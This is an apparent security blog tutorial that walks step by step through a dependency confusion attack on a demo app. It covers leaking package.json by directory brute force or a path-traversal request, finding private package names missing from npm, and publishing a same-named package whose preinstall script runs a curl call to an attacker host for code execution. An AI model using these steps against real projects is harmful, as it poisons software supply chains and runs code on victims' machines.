---
title: "Exploiting Dependency Confusion"
date: 2021-06-01 13:37:31
description: Exploiting Dependency Confusion
---

In this blog, We will step by step exploit a demo application vulnerable to Dependency Confusion attack. 

This blog is not about what dependency confusion is, that you can read [here](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610).

## Introduction to demo app

Our demo application is a simple app with only Backend and Frontend. The application allows the User from frontend to check if a string has an XSS payload in it or not.

### Backend

The backend is running on http://demo-app.com:1337. 

There is an API endpoint `http://demo-app.com:1337/?text=PAYLOAD` that checks for XSS payload in it.

![](/website/assets/images/dep-conf-1.png)

### Frontend

Frontend is running on http://demo-app.com:3000

The Frontend takes a query parameter "text". It then hits the backend API with that query parameter text, looks for XSS in that text, and displays the result on screen (see below)

![](/website/assets/images/dep-conf-2.png)

![](/website/assets/images/dep-conf-3.png)


## Overview Dependency Confusion

To Find if an application is vulnerable to Dependency confusion, our first step is to find all the possible packages the web application is using.  

### What are packages?

We can think of packages as `Developers sharing code for other developers to reuse it`. 

For example, If a developer develops a mongo database wrapper to enable MongoDB connection, he can make a package and publish it online(at central repository) and other people can reuse them. 

Now, In case you do not want to share your package with everyone in the world but keep it secret to people in your organization you can host your packages on a private organization repo and only people in your organization can use it. For example. Let's say you have a custom authentication process that you think everyone can use in your company. Making it public will not be a good idea. So there is also a concept of private repositories where developers can share private packages. 

Our goal as an attacker is to find as many packages as possible used in Frontend/Backend and find the ones that are private to the organization. Once we know all private packages, we can host them on npm and the web application will download our package instead of the private package(that's how this vulnerability works).

## Exploiting demo app

### Step 1

Find Packages installed in backend application. To do this we will need to leak the package.json file somehow or if we can leak the application’s source code. Some ways to do it:

* Directory brute force for sensitive information leak
    * http://site.com/.git can leak full source
    * http://site.com/package.json maybe we can just read package.json

* If the application is vulnerable to Local file disclosure, we can use it to leak package.json 
    * http://site.com/?file=../../../package.json

* OSINT
    * If its an open source app, you can try finding the source code on GitHub and see packages used

etc.. The goal here is to use your hacker instinct to find the leak and get the information about packages installed.

Following the above steps, running dirsearch on our demo application backend(http://demo-app:1337/) show’s the following result:

![](/website/assets/images/dep-conf-4.png)

So we can see the package.json file is exposed. It lists the following packages installed.
![](/website/assets/images/dep-conf-5.png)

### Step 2

Find packages installed in the Frontend application. We can do this in the following ways:
* Reviewing frontend source code and look for required packages. Look for the term `require()` or `import` in the source code

    ![](/website/assets/images/dep-conf-6.png)

* Frontend Application might be returning `node_modules` folders back to the user. Some applications do that in debug mode

    ![](/website/assets/images/dep-conf-9.png)


etc.. Again, the goal is to use your hacker instincts and find the packages.

### Step 3

List all the packages 

* Frontend
    * react
    * ez-get-url-params [looks suspecious]
    * react-dom
    * react-refresh
    * url
    ...

* Backend
    * body-parser
    * express
    * xss-finder-0xsapra [looks suspecious]


### Step 4

Now that we have a list of all the packages used in the application, the next step is to find which one of them is `not` on `npm`. We can simply do this by visiting https://www.npmjs.com/ and search for the package name. 

So 2 packages which I cant find are:

* xss-finder-0xsapra
![](/website/assets/images/dep-conf-7.png)

* ez-get-url-params
![](/website/assets/images/dep-conf-8.png)

Meaning these are private packages.

### Step 5

Upload the package with similar name  `xss-finder-0xsapra` or `ez-get-url-params` on NPM(with preinstall scripts to get RCE). Here are steps to upload `xss-finder-0xsapra` and perform the attack chain

* git clone https://github.com/0xsapra/dependency-confusion-expoit
* cd dependency-confusion-expoit
* Edit package.json following fields
    * Change module name `"name": "ez-get-url-params",` to `"name": "xss-finder-0xsapra",`. 
    * Change Version `"version": "1.0.0",` to `"version": "1.0.0",`
        * As you can see, leaked package.json shows `xss-finder-0xsapra` is at version `1.0.0` so we use the same version
    * Change `"preinstall": "curl http://yoursite.co.m"` to `"preinstall": "curl http://yoursite.com"` 
        * preinstall is the command that gets executed. use any bash command you want here
    ![](/website/assets/images/dep-conf-10.png)

* After editing package.json, next step is to upload this package to npm. To do this you can follow the steps from https://zellwk.com/blog/publish-to-npm/ . Here's the same steps:
    * Login/Signup into npm from https://www.npmjs.com/signup
    * Open terminal/bash on login into npm from terminal using `npm login` command
    ![](/website/assets/images/dep-conf-11.png)
    * Run following in terminal `npm publish .` and it will publish `xss-finder-0xsapra` to npm
    ![](/website/assets/images/dep-conf-12.png)
* You can now find the package uploaded on https://npmjs.com (https://www.npmjs.com/package/xss-finder-0xsapra)

### Step 6

Now whenever backend code will run `npm install` it will install our package instead and run the `preinstall` script (curl command in our case).

![](/website/assets/images/dep-conf-13.png)

## Conslusion

Following the above 5 steps, you should be able to properly test an application for dependency confusion vulnerability. 

I hope this clears the attack. 